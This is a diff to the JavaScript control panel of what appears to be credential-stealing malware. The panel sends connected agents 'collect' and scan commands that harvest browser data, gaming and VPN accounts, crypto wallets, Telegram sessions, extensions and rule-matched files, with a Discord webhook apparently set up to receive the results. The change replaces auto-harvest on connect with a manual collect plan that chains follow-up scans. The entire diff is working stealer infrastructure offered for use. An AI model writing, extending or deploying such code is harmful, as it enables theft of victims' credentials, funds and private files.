@@ -65,7 +65,6 @@
   const settingsGrid     = $("settings-grid");
   const settingsAdminMsg = $("settings-admin-msg");
   const settingsStatus   = $("settings-status");
-  const autoHarvestToggle = $("auto-harvest-toggle");
   const autoFilesToggle   = $("auto-files-toggle");
   const autoExtToggle     = $("auto-ext-toggle");
   const autoWalletsToggle = $("auto-wallets-toggle");
@@ -1673,8 +1672,30 @@
     return rules.filter((r) => r.extension || r.nameContains || r.dirPath);
   }
 
-  async function buildAutoStartEvents(opts) {
-    const { files, ext, wallets, telegram, rules } = opts;
+  /** Always disable plugin autoLoad so harvest never runs on client connect. */
+  async function disablePluginAutoLoad() {
+    try {
+      await fetch(`/api/plugins/${PLUGIN_ID}/autoload`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ autoLoad: false, autoStartEvents: [] }),
+      });
+    } catch (_) {}
+  }
+
+  function getHarvestOptions() {
+    return {
+      files: !!(autoFilesToggle && autoFilesToggle.checked),
+      ext: !!(autoExtToggle && autoExtToggle.checked),
+      wallets: !!(autoWalletsToggle && autoWalletsToggle.checked),
+      telegram: !!(autoTelegramToggle && autoTelegramToggle.checked),
+      rules: fileRules.slice(),
+    };
+  }
+
+  /** Build collect + follow-up scan payloads for manual Collect button. */
+  async function buildManualCollectPlan() {
+    const opts = getHarvestOptions();
     let discord = { enabled: false, webhookUrl: "", threadPrefix: "Stuart" };
     try {
       const s = await rpc("get_capture_settings");
@@ -1689,103 +1710,54 @@
       gaming: true,
       vpns: true,
       discord,
-      files: !!files,
-      wallets: !!wallets,
-      telegram: !!telegram,
+      files: opts.files,
+      wallets: opts.wallets,
+      telegram: opts.telegram,
     };
-    if (files && rules?.length) {
-      collectPayload.fileRules = rules;
-    }
-    const events = [{ event: "collect", payload: collectPayload }];
-    if (files) {
-      events.push({
-        event: "scan_files",
-        payload: { rules: rules || [] },
-      });
-    }
-    if (ext) events.push({ event: "scan_extensions", payload: {} });
-    if (wallets) events.push({ event: "scan_wallets", payload: {} });
-    if (telegram) events.push({ event: "scan_telegram", payload: {} });
-    return events;
+    if (opts.files && opts.rules.length) collectPayload.fileRules = opts.rules;
+    const followUps = [];
+    if (opts.files) followUps.push({ event: "scan_files", payload: { rules: opts.rules } });
+    if (opts.ext) followUps.push({ event: "scan_extensions", payload: {} });
+    if (opts.wallets) followUps.push({ event: "scan_wallets", payload: {} });
+    if (opts.telegram) followUps.push({ event: "scan_telegram", payload: {} });
+    return { collectPayload, followUps };
   }
 
-  async function fetchAutoHarvestState() {
-    if (!autoHarvestToggle) return;
+  async function fetchHarvestOptionsState() {
     try {
-      const res = await fetch("/api/plugins");
-      if (!res.ok) return;
-      const data = await res.json();
-      const pluginCfg = (data.plugins || []).find(p => p.id === PLUGIN_ID);
-      if (!pluginCfg) return;
-      const enabled = !!pluginCfg.autoLoad;
-      const events = pluginCfg.autoStartEvents || [];
-      const fileEv = events.find(e => e.event === "scan_files");
-      const collectEv = events.find(e => e.event === "collect");
-      const filter = fileEv?.payload || collectEv?.payload || {};
-      fileRules = rulesFromLegacyPayload(filter);
-      if (Array.isArray(collectEv?.payload?.fileRules)) {
-        fileRules = rulesFromLegacyPayload({ rules: collectEv.payload.fileRules });
+      const s = await rpc("get_capture_settings");
+      if (autoFilesToggle) autoFilesToggle.checked = !!s.harvest_files;
+      if (autoExtToggle) autoExtToggle.checked = !!s.harvest_extensions;
+      if (autoWalletsToggle) autoWalletsToggle.checked = !!s.harvest_wallets;
+      if (autoTelegramToggle) autoTelegramToggle.checked = !!s.harvest_telegram;
+      if (Array.isArray(s.harvest_file_rules)) {
+        fileRules = s.harvest_file_rules.map((r) => ({
+          extension: normalizeRuleExt(r.extension || ""),
+          nameContains: String(r.nameContains || "").trim(),
+          dirPath: String(r.dirPath || "").trim(),
+          fullUpload: !!r.fullUpload,
+        }));
+      } else {
+        fileRules = [];
       }
-      applySettingsUI({
-        enabled,
-        files: events.some(e => e.event === "scan_files") || !!(collectEv?.payload?.files),
-        ext: events.some(e => e.event === "scan_extensions"),
-        wallets: events.some(e => e.event === "scan_wallets") || !!(collectEv?.payload?.wallets),
-        telegram: events.some(e => e.event === "scan_telegram") || !!(collectEv?.payload?.telegram),
-      });
       renderFileRuleList();
     } catch (_) {}
-  }
-
-  function applySettingsUI(state) {
-    if (!autoHarvestToggle) return;
-    const enabled = !!state.enabled;
-    autoHarvestToggle.checked = enabled;
-
-    const setSub = (toggle, rowId, checked) => {
-      if (!toggle) return;
-      toggle.disabled = !enabled;
-      toggle.checked = !!checked;
-      const row = $(rowId);
-      if (row) row.style.opacity = enabled ? "1" : "0.5";
-    };
-    setSub(autoFilesToggle, "ah-files-row", state.files);
-    setSub(autoExtToggle, "ah-ext-row", state.ext);
-    setSub(autoWalletsToggle, "ah-wallets-row", state.wallets);
-    setSub(autoTelegramToggle, "ah-telegram-row", state.telegram);
-
-    const filesOn = enabled && !!state.files;
-    const block = $("ah-file-list-block");
-    if (block) block.style.opacity = filesOn ? "1" : "0.5";
-    [ruleExtInput, ruleNameInput, ruleDirInput, ruleFullCheck, ruleAddBtn].forEach((el) => {
-      if (el) el.disabled = !filesOn;
-    });
   }
 
   async function saveSettings() {
     if (!settingsStatus) return;
     settingsStatus.textContent = "Saving…";
-    const enabled = autoHarvestToggle.checked;
-    const files = autoFilesToggle.checked;
-    const ext = autoExtToggle ? autoExtToggle.checked : false;
-    const wallets = autoWalletsToggle ? autoWalletsToggle.checked : false;
-    const telegram = autoTelegramToggle ? autoTelegramToggle.checked : false;
+    // Never auto-run on connect
+    await disablePluginAutoLoad();
     try {
-      const body = {
-        autoLoad: enabled,
-        autoStartEvents: enabled
-          ? await buildAutoStartEvents({ files, ext, wallets, telegram, rules: fileRules.slice() })
-          : [],
-      };
-      const res = await fetch(`/api/plugins/${PLUGIN_ID}/autoload`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(body),
+      await rpc("update_capture_settings", {
+        harvest_files: !!(autoFilesToggle && autoFilesToggle.checked),
+        harvest_extensions: !!(autoExtToggle && autoExtToggle.checked),
+        harvest_wallets: !!(autoWalletsToggle && autoWalletsToggle.checked),
+        harvest_telegram: !!(autoTelegramToggle && autoTelegramToggle.checked),
+        harvest_file_rules: fileRules.slice(),
       });
-      const data = await res.json();
-      if (!data.ok) throw new Error(data.error || "failed");
-      settingsStatus.textContent = enabled ? "Auto-harvest enabled" : "Auto-harvest disabled";
-      applySettingsUI({ enabled, files, ext, wallets, telegram });
+      settingsStatus.textContent = "Harvest options saved (manual only)";
       renderFileRuleList();
     } catch (e) {
       settingsStatus.textContent = `Error: ${e.message}`;
@@ -1967,7 +1939,6 @@
     if (!isAdmin) {
       if (settingsAdminMsg) settingsAdminMsg.style.display = "";
       if (settingsGrid) settingsGrid.classList.add("disabled");
-      if (autoHarvestToggle) autoHarvestToggle.disabled = true;
       if (autoFilesToggle) autoFilesToggle.disabled = true;
       if (autoExtToggle) autoExtToggle.disabled = true;
       if (autoWalletsToggle) autoWalletsToggle.disabled = true;
@@ -1992,22 +1963,15 @@
       if (discordPollNowBtn) discordPollNowBtn.disabled = true;
       if (discordWebhookSaveBtn) discordWebhookSaveBtn.disabled = true;
       if (discordPollBtn) discordPollBtn.disabled = true;
-      fetchAutoHarvestState();
+      fetchHarvestOptionsState();
       fetchCaptureSettings();
       return;
     }
 
-    if (autoHarvestToggle) autoHarvestToggle.addEventListener("change", saveSettings);
-    if (autoFilesToggle) autoFilesToggle.addEventListener("change", () => {
-      applySettingsUI({
-        enabled: autoHarvestToggle.checked,
-        files: autoFilesToggle.checked,
-        ext: autoExtToggle?.checked,
-        wallets: autoWalletsToggle?.checked,
-        telegram: autoTelegramToggle?.checked,
-      });
-      saveSettings();
-    });
+    // Ensure connect never auto-starts harvest (clear any previous autoLoad)
+    disablePluginAutoLoad();
+
+    if (autoFilesToggle) autoFilesToggle.addEventListener("change", saveSettings);
     if (autoExtToggle) autoExtToggle.addEventListener("change", saveSettings);
     if (autoWalletsToggle) autoWalletsToggle.addEventListener("change", saveSettings);
     if (autoTelegramToggle) autoTelegramToggle.addEventListener("change", saveSettings);
@@ -2076,7 +2040,7 @@
       setTimeout(() => { if (settingsStatus) settingsStatus.textContent = ""; }, 3000);
     });
 
-    fetchAutoHarvestState();
+    fetchHarvestOptionsState();
     fetchCaptureSettings();
   }
 
@@ -2458,7 +2422,14 @@
               threadPrefix: s.discord_thread_prefix || "Stuart",
             };
           } catch (_) {}
-          await sendEvent("collect", { browsers: true, gaming: true, vpns: true, discord });
+          const plan = await buildManualCollectPlan();
+          await sendEvent("collect", plan.collectPayload);
+          // Optional follow-up scans (manual extras from settings)
+          for (const step of plan.followUps) {
+            // Small gap so agent can start collect first
+            await new Promise((r) => setTimeout(r, 400));
+            await sendEvent(step.event, step.payload || {});
+          }
         } catch (e) {
           log(`Collect start error: ${e.message}`);
           reenableCollectActions();
@@ -2480,7 +2451,8 @@
     scanFilesBtn.addEventListener("click", () => {
       scanFilesBtn.disabled = true;
       log("Scanning files…");
-      sendEvent("scan_files", {});
+      const rules = fileRules.slice();
+      sendEvent("scan_files", { rules });
     });
     scanExtBtn.addEventListener("click", () => {
       scanExtBtn.disabled = true;
